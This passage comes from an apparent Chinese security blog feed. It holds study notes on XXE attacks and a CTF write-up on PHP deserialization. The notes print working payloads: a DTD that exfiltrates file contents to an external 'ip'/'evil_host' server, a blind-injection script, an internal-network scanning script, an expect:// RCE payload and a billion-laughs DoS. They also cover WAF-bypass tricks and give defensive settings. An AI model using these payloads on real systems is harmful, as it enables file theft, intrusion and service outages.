外带</p><p>外带就必须要能发起请求,我们可以在外部实体定义的时候发起请求,但是只是发起请求还不够,还必须能把数据传出去</p><blockquote><p>而我们的数据本身也是一个对外的请求，也就是说，我们需要在请求中引用另一次请求的结果，分析下来只有我们的参数实体能做到了(并且根据规范，我们必须在一个 DTD 文件中才能完成“请求中引用另一次请求的结果”的要求)</p></blockquote><p><strong>test.dtd</strong></p><pre><code>&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///D:/test.txt&quot;&gt;&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; send SYSTEM &#39;http://ip:9999?p=%file;&#39;&gt;&quot;&gt;</code></pre><p>因为实体中的值不能有%</p><p><strong>payload：</strong></p><pre><code>&lt;!DOCTYPE convert [ &lt;!ENTITY % remote SYSTEM &quot;http://ip/test.dtd&quot;&gt;%remote;%int;%send;]&gt;</code></pre><p>连续调用三个参数实体,先调用% remote, 调用后请求远程服务器上的test.dtd,</p><p>然后调用% int 去调用test.dtd中的%file,%file就去获取服务器上的敏感文件,然后将得到的结果填入到%send中,最后再调用%send把读取到的数据发送到vps中,实现了外带,解决了XXE无回显的问题</p><p>可利用的不只是file协议,针对不同的平台有不同的协议可用</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181120002647-e93bbf00-ec17-1.png" alt></p><h1 id="0x04-XXE利用"><a href="#0x04-XXE利用" class="headerlink" title="0x04 XXE利用"></a>0x04 XXE利用</h1><h2 id="HTTP-内网主机探测"><a href="#HTTP-内网主机探测" class="headerlink" title="HTTP 内网主机探测"></a><strong>HTTP 内网主机探测</strong></h2><p>我们以存在 XXE 漏洞的服务器为我们探测内网的支点。要进行内网探测我们还需要做一些准备工作，我们需要先利用 file 协议读取我们作为支点服务器的网络配置文件，看一下有没有内网，以及网段大概是什么样子（我以linux 为例），我们可以尝试读取 /etc/network/interfaces 或者 /proc/net/arp 或者 /etc/host 文件以后我们就有了大致的探测方向了</p><p>探测脚本:  </p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> base64<span class="token comment" spellcheck="true">#Origtional XML that the server accepts</span><span class="token comment" spellcheck="true">#&lt;xml></span><span class="token comment" spellcheck="true">#    &lt;stuff>user&lt;/stuff></span><span class="token comment" spellcheck="true">#&lt;/xml></span><span class="token keyword">def</span> <span class="token function">build_xml</span><span class="token punctuation">(</span>string<span class="token punctuation">)</span><span class="token punctuation">:</span>    xml <span class="token operator">=</span> <span class="token triple-quoted-string string">"""&lt;?xml version="1.0" encoding="ISO-8859-1"?>"""</span>    xml <span class="token operator">=</span> xml <span class="token operator">+</span> <span class="token string">"\r\n"</span> <span class="token operator">+</span> <span class="token triple-quoted-string string">"""&lt;!DOCTYPE foo [ &lt;!ELEMENT foo ANY >"""</span>    xml <span class="token operator">=</span> xml <span class="token operator">+</span> <span class="token string">"\r\n"</span> <span class="token operator">+</span> <span class="token triple-quoted-string string">"""&lt;!ENTITY xxe SYSTEM """</span> <span class="token operator">+</span> <span class="token string">'"'</span> <span class="token operator">+</span> string <span class="token operator">+</span> <span class="token string">'"'</span> <span class="token operator">+</span> <span class="token triple-quoted-string string">""">]>"""</span>    xml <span class="token operator">=</span> xml <span class="token operator">+</span> <span class="token string">"\r\n"</span> <span class="token operator">+</span> <span class="token triple-quoted-string string">"""&lt;xml>"""</span>    xml <span class="token operator">=</span> xml <span class="token operator">+</span> <span class="token string">"\r\n"</span> <span class="token operator">+</span> <span class="token triple-quoted-string string">"""    &lt;stuff>&amp;xxe;&lt;/stuff>"""</span>    xml <span class="token operator">=</span> xml <span class="token operator">+</span> <span class="token string">"\r\n"</span> <span class="token operator">+</span> <span class="token triple-quoted-string string">"""&lt;/xml>"""</span>    send_xml<span class="token punctuation">(</span>xml<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">send_xml</span><span class="token punctuation">(</span>xml<span class="token punctuation">)</span><span class="token punctuation">:</span>    headers <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'Content-Type'</span><span class="token punctuation">:</span> <span class="token string">'application/xml'</span><span class="token punctuation">}</span>    x <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span><span class="token string">'http://34.200.157.128/CUSTOM/NEW_XEE.php'</span><span class="token punctuation">,</span> data<span class="token operator">=</span>xml<span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">.</span>text    coded_string <span class="token operator">=</span> x<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token comment" spellcheck="true"># a little split to get only the base64 encoded value</span>    <span class="token keyword">print</span> coded_string<span class="token comment" spellcheck="true">#   print base64.b64decode(coded_string)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">255</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        i <span class="token operator">=</span> str<span class="token punctuation">(</span>i<span class="token punctuation">)</span>        ip <span class="token operator">=</span> <span class="token string">'10.0.0.'</span> <span class="token operator">+</span> i        string <span class="token operator">=</span> <span class="token string">'php://filter/convert.base64-encode/resource=http://'</span> <span class="token operator">+</span> ip <span class="token operator">+</span> <span class="token string">'/'</span>        <span class="token keyword">print</span> string        build_xml<span class="token punctuation">(</span>string<span class="token punctuation">)</span>    <span class="token keyword">except</span><span class="token punctuation">:</span><span class="token keyword">continue</span></code></pre><p><strong>我是SB</strong></p><h2 id="HTTP-内网主机端口扫描"><a href="#HTTP-内网主机端口扫描" class="headerlink" title="HTTP 内网主机端口扫描"></a><strong>HTTP 内网主机端口扫描</strong></h2><p>找到了内网的一台主机，<strong>想要知道攻击点在哪，我们还需要进行端口扫描</strong>，端口扫描的脚本主机探测几乎没有什么变化，只要把ip 地址固定，然后循环遍历端口就行了，当然<strong>一般</strong>我们<strong>端口是通过响应的时间的长短判断该该端口是否开放的</strong>，读者可以自行修改一下，当然除了这种方法，我们还能结合 burpsuite 的 intruder模块来 进行端口探测</p><h2 id="内网盲注-CTF"><a href="#内网盲注-CTF" class="headerlink" title="内网盲注(CTF)"></a><a href="https://xz.aliyun.com/t/3357#toc-13" target="_blank" rel="noopener"><strong>内网盲注(CTF)</strong></a></h2><p>放个脚本学习别人的写脚本思路和利用思路</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">'http://39.107.33.75:33899/common.php'</span>s <span class="token operator">=</span> requests<span class="token punctuation">.</span>Session<span class="token punctuation">(</span><span class="token punctuation">)</span>result <span class="token operator">=</span> <span class="token string">''</span>data <span class="token operator">=</span> <span class="token punctuation">{</span>        <span class="token string">"name"</span><span class="token punctuation">:</span><span class="token string">"evil_man"</span><span class="token punctuation">,</span>        <span class="token string">"email"</span><span class="token punctuation">:</span><span class="token string">"testabcdefg@gmail.com"</span><span class="token punctuation">,</span>        <span class="token string">"comment"</span><span class="token punctuation">:</span><span class="token triple-quoted-string string">"""&lt;?xml version="1.0" encoding="utf-8"?>                &lt;!DOCTYPE root [                &lt;!ENTITY % dtd SYSTEM "http://evil_host/evil.dtd">                %dtd;]>                """</span><span class="token punctuation">}</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">28</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> j <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">48</span><span class="token punctuation">,</span><span class="token number">123</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                f <span class="token operator">=</span> open<span class="token punctuation">(</span><span class="token string">'./evil.dtd'</span><span class="token punctuation">,</span><span class="token string">'w'</span><span class="token punctuation">)</span>            payload2 <span class="token operator">=</span> <span class="token triple-quoted-string string">"""&lt;!ENTITY % file SYSTEM "php://filter/read=zlib.deflate/convert.base64-encode/resource=http://192.168.223.18/test.php?shop=3'-(case%a0when((select%a0group_concat(total)%a0from%a0albert_shop)like%a0binary('{}'))then(0)else(1)end)-'1">                &lt;!ENTITY % all "&lt;!ENTITY % send SYSTEM 'http://evil_host/?result=%file;'>">                %all;                %send;"""</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span><span class="token string">'_'</span><span class="token operator">*</span>i<span class="token operator">+</span>chr<span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'_'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">27</span><span class="token operator">-</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>                f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>payload2<span class="token punctuation">)</span>                f<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>                <span class="token keyword">print</span> <span class="token string">'test {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>chr<span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">)</span>                r <span class="token operator">=</span> s<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">)</span>                <span class="token keyword">if</span> <span class="token string">"Oti3a3LeLPdkPkqKF84xs="</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>content <span class="token operator">and</span> chr<span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token operator">!=</span><span class="token string">'_'</span><span class="token punctuation">:</span>                        result <span class="token operator">+=</span> chr<span class="token punctuation">(</span>j<span class="token punctuation">)</span>                        <span class="token keyword">print</span> chr<span class="token punctuation">(</span>j<span class="token punctuation">)</span>                        <span class="token keyword">break</span><span class="token keyword">print</span> result</code></pre><hr><h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><p>下面的内容和JAVA有关,由于我没学过JAVA,所以这里直接贴大佬总结好的东西</p><p>因为现实情况下,大部分XXE都是在java框架出现的,java有个 jar://  协议,</p><p>jar:// 协议的格式: </p><p>jar:{url}!{path}</p><p>实例: </p><pre><code>jar:http://host/application.jar!/file/within/the/zip这个 ! 后面就是其需要从中解压出的文件</code></pre><p><strong>jar 协议处理文件的过程：</strong></p><p>(1) 下载 jar/zip 文件到临时文件中<br>(2) 提取出我们指定的文件<br>(3) 删除临时文件</p><p><strong>那么我们怎么找到我们下载的临时文件呢？</strong></p><blockquote><p>因为在 java 中 file:/// 协议可以起到列目录的作用，所以我们能用 file:/// 协议配合 jar:// 协议使用</p></blockquote><p>更多的看下面这个..</p><p><a href="https://xz.aliyun.com/t/3357#toc-14" target="_blank" rel="noopener">https://xz.aliyun.com/t/3357#toc-14</a></p><h2 id="PHP-expect-RCE"><a href="#PHP-expect-RCE" class="headerlink" title="PHP expect RCE"></a><strong>PHP expect RCE</strong></h2><p>由于 PHP 的 expect 并不是默认安装扩展，如果安装了这个expect 扩展我们就能直接利用 XXE 进行 RCE</p><p><strong>示例代码：</strong></p><pre><code>&lt;!DOCTYPE root[&lt;!ENTITY cmd SYSTEM &quot;expect://id&quot;&gt;]&gt;&lt;dir&gt;&lt;file&gt;&amp;cmd;&lt;/file&gt;&lt;/dir&gt;</code></pre><h2 id="利用-XXE-进行-DOS-攻击"><a href="#利用-XXE-进行-DOS-攻击" class="headerlink" title="利用 XXE 进行 DOS 攻击"></a>利用 XXE 进行 DOS 攻击</h2><p><strong>示例代码：</strong></p><pre><code>&lt;?xml version=&quot;1.0&quot;?&gt;     &lt;!DOCTYPE lolz [     &lt;!ENTITY lol &quot;lol&quot;&gt;     &lt;!ENTITY lol2 &quot;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&quot;&gt;     &lt;!ENTITY lol3 &quot;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&quot;&gt;     &lt;!ENTITY lol4 &quot;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&quot;&gt;     &lt;!ENTITY lol5 &quot;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&quot;&gt;     &lt;!ENTITY lol6 &quot;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&quot;&gt;     &lt;!ENTITY lol7 &quot;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&quot;&gt;     &lt;!ENTITY lol8 &quot;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&quot;&gt;     &lt;!ENTITY lol9 &quot;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&quot;&gt;     ]&gt;     &lt;lolz&gt;&amp;lol9;&lt;/lolz&gt;</code></pre><h2 id="JSON-content-type-XXE"><a href="#JSON-content-type-XXE" class="headerlink" title="JSON content-type XXE"></a><strong>JSON content-type XXE</strong></h2><p>尽管web服务可能在编程时只使用其中一种格式，但服务器却可以接受开发人员并没有预料到的其他数据格式，这就有可能会导致JSON节点受到XXE（XML外部实体）攻击</p><p>简单来说,就是修改HTTP请求头中的content-type 中的 application/json 改为application/xml  然后请求的时候发送恶意的xml数据</p><h1 id="0x05-XXE绕过"><a href="#0x05-XXE绕过" class="headerlink" title="0x05  XXE绕过"></a>0x05  XXE绕过</h1><p>下面的方法是用于绕过WAF的</p><h2 id="方法1：文档中的额外空格"><a href="#方法1：文档中的额外空格" class="headerlink" title="方法1：文档中的额外空格"></a>方法1：文档中的额外空格</h2><p>由于XXE通常在XML文档的开头，所以比较省事儿的WAF可以避免处理整个文档，而只解析它的开头。但是，XML格式允许在格式化标记属性时使用任意数量的空格，因此攻击者可以在<code>或</code>中插入额外的空格，从而绕过此类WAF。</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190206172823-8c9330fe-29f1-1.png" alt></p><h2 id="方法2：格式无效"><a href="#方法2：格式无效" class="headerlink" title="方法2：格式无效"></a>方法2：格式无效</h2><p>发送特殊格式的XML文档,使WAF认为无效</p><p><strong>链接到未知的实体</strong></p><blockquote><p>比较成熟的WAF设置通常不会读取链接文件的内容。这种策略通常是有意义的，否则，WAF本身也可能成为攻击的目标。问题是，外部资源的链接不仅可以存在于文档的第三部分（正文），还可以存在于声明&lt;! DOCTYPE&gt;中 。<br>这意味着未读取文件内容的WAF将不会读取文档中实体的声明。而指向未知实体的链接又会阻止XML解析器导致错误。</p></blockquote><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190206173249-2af53300-29f2-1.png" alt></p><h2 id="方法3-外来编码（Exotic-encodings）"><a href="#方法3-外来编码（Exotic-encodings）" class="headerlink" title="方法3:外来编码（Exotic encodings）"></a>方法3:外来编码（Exotic encodings）</h2><p>除了前面提到的xml文档的三个部分之外，还有位于它们之上的第四个部分，它们控制文档的编码（例如<?xml?>）——文档的第一个字节带有可选的BOM(字节顺序标记)。<br>更多信息：<a href="https://www.w3.org/TR/xml/#sec-guessing" target="_blank" rel="noopener">https://www.w3.org/TR/xml/#sec-guessing</a><br>一个xml文档不仅可以用UTF-8编码，也可以用UTF-16(两个变体 - BE和LE)、UTF-32(四个变体 - BE、LE、2143、3412)和EBCDIC编码。<br>在这种编码的帮助下，使用正则表达式可以很容易地绕过WAF，因为在这种类型的WAF中，正则表达式通常仅配置为单字符集。<br>外来编码也可用于绕过成熟的WAF，因为它们并不总是能够处理上面列出的所有编码。例如，libxml2解析器只支持一种类型的utf-32 - utf-32BE，特别是不支持BOM。</p><h2 id="方法4：在一个文档中使用两种类型的编码"><a href="#方法4：在一个文档中使用两种类型的编码" class="headerlink" title="方法4：在一个文档中使用两种类型的编码"></a>方法4：在一个文档中使用两种类型的编码</h2><p>在上一节中，我们演示了文档的编码通常由其第一个字节指定。但是当包含编码属性的<?xml?>标记引用文档开头的不同字符集时会发生什么？在这种情况下，一些解析器更改编码，使文件的开头有一组字符，其余的是另一组编码。。也就是说，不同的解析器可能在不同的时间转换编码。Java解析器(javax.xml.parsers)在<?xml?>结束后严格地更改字符集，而libxml2解析器可以在执行“编码”属性的值之后或在处理<?xml?>之前或之后切换编码。<br>只有在根本不处理这些文件时，比较成熟的WAF才能可靠地防止这些文件中的攻击。我们还必须记住，有许多同义词编码，例如UTF-32BE和UCS-4BE。此外，有些编码可能不同，但从编码文档初始部分 <code>的角度来看，它们是兼容的。例如，看似UTF-8的文档可能包含字符串</code>。<br>这里有一些例子。为了简明扼要，我们不把XXE放在文档里。<br>libxml2解析器将文档视为有效，但是，javax.xml.parsers set中的Java引擎认为它无效：</p><h1 id="0x06-XXE防御"><a href="#0x06-XXE防御" class="headerlink" title="0x06  XXE防御"></a>0x06  XXE防御</h1><h2 id="使用语言中推荐的禁用外部实体的方法"><a href="#使用语言中推荐的禁用外部实体的方法" class="headerlink" title="使用语言中推荐的禁用外部实体的方法"></a><strong>使用语言中推荐的禁用外部实体的方法</strong></h2><p><strong>PHP：</strong></p><pre><code>libxml_disable_entity_loader(true);</code></pre><p><strong>JAVA:</strong></p><pre><code>DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance();dbf.setExpandEntityReferences(false);.setFeature(&quot;http://apache.org/xml/features/disallow-doctype-decl&quot;,true);.setFeature(&quot;http://xml.org/sax/features/external-general-entities&quot;,false).setFeature(&quot;http://xml.org/sax/features/external-parameter-entities&quot;,false);</code></pre><p><strong>Python：</strong></p><pre><code>from lxml import etreexmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False))</code></pre><h2 id="手动黑名单过滤-不推荐"><a href="#手动黑名单过滤-不推荐" class="headerlink" title="手动黑名单过滤(不推荐)"></a><strong>手动黑名单过滤(不推荐)</strong></h2><p>过滤关键词：</p><pre><code>&lt;!DOCTYPE、&lt;!ENTITY SYSTEM、PUBLIC</code></pre><h1 id="0x07-XXE挖掘"><a href="#0x07-XXE挖掘" class="headerlink" title="0x07  XXE挖掘"></a>0x07  XXE挖掘</h1><ol><li>检测XML是否会被正常解析</li><li>检测服务器是否支持DTD引用外部实体</li><li>测试回显或者盲注</li></ol><p>如果以上两个条件都满足,那么就有可能存在XXE漏洞的</p><p>白盒下:  </p><ol><li>审计是否导入并使用官方或第三方XML解析器</li><li>审计是否对XML解析器进行安全配置</li><li>审计被解析的XML文档数据是否<strong>可控</strong></li></ol><h1 id="0x08-总结"><a href="#0x08-总结" class="headerlink" title="0x08  总结"></a>0x08  总结</h1><p>XXE这个点的话,先理解原理和挖掘思路,再对利用方法多进行实操就应该差不多了. </p><p>以上笔记应该反复看,反复出心得,并不断更新</p><h1 id="0x09-参考资料"><a href="#0x09-参考资料" class="headerlink" title="0x09  参考资料"></a>0x09  参考资料</h1><p><a href="https://www.k0rz3n.com/2018/11/19/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%20XXE%20%E6%BC%8F%E6%B4%9E/#%E4%BA%8C%E3%80%81%E7%AE%80%E5%8D%95%E4%BB%8B%E7%BB%8D%E4%B8%80%E4%B8%8B%E8%83%8C%E6%99%AF%E7%9F%A5%E8%AF%86%EF%BC%9A" target="_blank" rel="noopener">一篇文章带你理解漏洞之 XXE 漏洞</a></p><p><a href="https://xz.aliyun.com/t/4059" target="_blank" rel="noopener">绕过WAF保护的XXE</a></p><p><a href="https://mabin004.github.io/2018/07/03/XXE%E6%BC%8F%E6%B4%9E%E6%94%BB%E5%87%BB%E5%92%8C%E9%98%B2%E5%BE%A1/" target="_blank" rel="noopener">XXE漏洞攻击和防御</a></p><p><a href="https://www.anquanke.com/post/id/86075" target="_blank" rel="noopener">XXE漏洞攻防之我见</a></p><p><a href="https://zhuanlan.zhihu.com/p/31629438" target="_blank" rel="noopener">十分钟带你了解XXE</a></p><p><a href="https://xz.aliyun.com/t/5860" target="_blank" rel="noopener">一次Blind-XXE漏洞挖掘之旅</a></p><p><a href="https://www.freebuf.com/articles/web/177979.html" target="_blank" rel="noopener">XXE漏洞利用技巧：从XML到远程代码执行</a></p><p><a href="https://xz.aliyun.com/t/2249" target="_blank" rel="noopener">https://xz.aliyun.com/t/2249</a></p><p><a href="https://xz.aliyun.com/t/122#toc-0" target="_blank" rel="noopener">https://xz.aliyun.com/t/122#toc-0</a></p><p><a href="https://p0rz9.github.io/2019/02/27/xxe/" target="_blank" rel="noopener">https://p0rz9.github.io/2019/02/27/xxe/</a></p><p><a href="https://baike.baidu.com/item/OOB/1828538" target="_blank" rel="noopener">https://baike.baidu.com/item/OOB/1828538</a></p><p><a href="https://cloud.tencent.com/developer/article/1079593" target="_blank" rel="noopener">https://cloud.tencent.com/developer/article/1079593</a></p><p><strong><em>Stop managing your time. Start managing your focus.</em></strong></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00  前言&quot;&gt;&lt;/a&gt;0x00  前言&lt;/h1&gt;&lt;p&gt;&lt;em&gt;把XXE归为TOP10基础漏洞,其实是因为我觉得是,并且难得分类了,以后所有的漏洞我都归类为TOP10基础漏洞&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;XXE的前身是XML注入,因为黑客想要得到的东西越来越多,所以出现了XXE&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;实际上，XXE不是一个bug，而是XML解析器的well-documented特性。XML数据格式允许您在XML文档中包含任何外部文本文件的内容。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img src=&quot;https://picture-1253331270.cos.ap-beijing.myqcloud.com/xml%E6%B3%A8%E5%85%A5.png&quot; alt&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;本学习笔记,大量参考自网络上各位大佬总结好的,再加上自己的心得总结而成,用途仅用于安全技术学习.文末注明参考资料,侵删.&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
    
      <category term="TOP10基础漏洞" scheme="https://hack-for.fun/categories/TOP10%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E/"/>
    
    
      <category term="XXE" scheme="https://hack-for.fun/tags/XXE/"/>
    
      <category term="XML" scheme="https://hack-for.fun/tags/XML/"/>
    
      <category term="内网" scheme="https://hack-for.fun/tags/%E5%86%85%E7%BD%91/"/>
    
  </entry>
  
  <entry>
    <title>Web_php_unserialize引起的思考</title>
    <link href="https://hack-for.fun/posts/20200108/"/>
    <id>https://hack-for.fun/posts/20200108/</id>
    <published>2020-01-07T16:00:00.000Z</published>
    <updated>2020-02-12T02:45:53.782Z</updated>
    
    <content type="html"><![CDATA[<p>先放出解题POC</p><pre class=" language-PHP"><code class="language-PHP"><?phpclass Demo {     private $file = 'index.php'; //private类型的成员变量    public function __construct($file) {  // 为file赋初值        $this->file = $file;     }    function __destruct() { //反序列化结束后,调用        echo @highlight_file($this->file, true);     }    function __wakeup() { // 绕过__wakeup        if ($this->file != 'index.php') {             //the secret is in the fl4g.php            $this->file = 'index.php';         }     } }$a = new Demo('fl4g.php');  $b = serialize($a);// 下面这段代码是重点$b = str_replace('O:4','O:+4',$b);$b = str_replace(':1:',':2:',$b);echo (base64_encode($b));?></code></pre><a id="more"></a>题目代码<pre class=" language-PHP"><code class="language-PHP"> <?php class Demo {     private $file = 'index.php'; //private类型的成员变量    public function __construct($file) {  // 为file赋初值        $this->file = $file;     }    function __destruct() { //反序列化结束后,调用        echo @highlight_file($this->file, true);     }    function __wakeup() { // 绕过__wakeup        if ($this->file != 'index.php') {             //the secret is in the fl4g.php            $this->file = 'index.php';         }     } }if (isset($_GET['var'])) {  // 提供了GET参数为var    $var = base64_decode($_GET['var']); // 对GET到的var先进行base64解码    if (preg_match('/[oc]:\d+:/i', $var)) {  // 正则匹配/d 匹配数字,匹配oc,不区分大小写,也就是匹配 "o或者c:数字:"        die('stop hacking!');     } else {        @unserialize($var); //如果匹配不成功对var进行反序列化,现在很明确了,就是将payload base64打过去就行了.    } } else {     highlight_file("index.php"); } ?></code></pre><p>一般情况下,遇到反序列化中的private类型的成员变量,在进行反序列化时,将得到的payload中的<strong>类名前后加上%00</strong>就能成功打到flag</p><p>在CTF tools里base64encode就不行</p><p>绕过__wakeup 也非常简单</p><p>CVE-2016-7124的漏洞，即当序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过__wakeup的执行</p><p>但是这道题就不行,这道题目必须在PHP脚本里面对其进行base64encode</p><p>具体原因,后面有空,深入研究?其实我觉得就是编码问题</p><p>%00不会被当做特殊字符对待</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;先放出解题POC&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;PHP&quot;&gt;&amp;lt;?php
class Demo { 
    private $file = &amp;#39;index.php&amp;#39;; //private类型的成员变量
    public function __construct($file) {  // 为file赋初值
        $this-&amp;gt;file = $file; 
    }
    function __destruct() { //反序列化结束后,调用
        echo @highlight_file($this-&amp;gt;file, true); 
    }
    function __wakeup() { // 绕过__wakeup
        if ($this-&amp;gt;file != &amp;#39;index.php&amp;#39;) { 
            //the secret is in the fl4g.php
            $this-&amp;gt;file = &amp;#39;index.php&amp;#39;; 
        } 
    } 
}
$a = new Demo(&amp;#39;fl4g.php&amp;#39;);  
$b = serialize($a);
// 下面这段代码是重点
$b = str_replace(&amp;#39;O:4&amp;#39;,&amp;#39;O:+4&amp;#39;,$b);
$b = str_replace(&amp;#39;:1:&amp;#39;,&amp;#39;:2:&amp;#39;,$b);
echo (base64_encode($b));

?&amp;gt;&lt;/code&gt;&lt;/pre&gt;
    
    </summary>
    
    
    
      <category term="反序列化" scheme="https://hack-for.fun/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
</feed>
